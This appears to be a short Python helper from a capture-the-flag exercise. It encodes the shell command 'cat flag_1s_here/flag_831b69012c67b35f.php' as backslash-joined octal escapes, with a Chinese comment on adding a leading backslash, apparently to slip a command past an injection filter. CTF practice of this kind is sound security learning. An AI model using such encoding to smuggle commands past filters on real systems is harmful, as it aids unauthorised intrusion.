str = "cat flag_1s_here/flag_831b69012c67b35f.php"
arr = []
for i in str:
    lett = oct(ord(i))
    print(lett)
    lett = lett.replace("0o", "")
    arr.append(lett)
print(arr)
sym = "\\"
# print(arr) 将所有的八进制组合，最终的结果第一个地方应该再添加一个\
ccc = sym.join(arr)
print(ccc)
